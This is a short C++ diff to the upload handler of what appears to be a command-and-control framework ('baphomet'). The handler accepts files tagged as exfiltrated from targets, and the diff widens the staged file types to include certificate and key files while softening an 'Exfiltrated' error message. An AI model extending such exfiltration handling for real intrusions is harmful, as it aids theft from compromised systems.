@@ -14,7 +14,7 @@ lurch::baphomet::upload(const std::string &file, const std::string &extension) {
 
     if(file.starts_with("!!BAPHOMET_EXFIL!!")) {
         if(tasks.empty()) {
-            return error("Exfiltrated file sent, but one was not expected.");
+            return error("file sent, but one was not expected.");
         }
 
         //
@@ -36,6 +36,7 @@ lurch::baphomet::upload(const std::string &file, const std::string &extension) {
         );
     }
 
+
     //
     // Otherwise, just stage the file. Only these file types are accepted.
     //
@@ -44,7 +45,9 @@ lurch::baphomet::upload(const std::string &file, const std::string &extension) {
         extension != "exe"  &&
         extension != "bin"  &&
         extension != "o"    &&
-        extension != "obj"
+        extension != "obj"  &&
+        extension != "crt"  &&
+        extension != "key"
         ) {
         return error("invalid file type for this object.");
     }
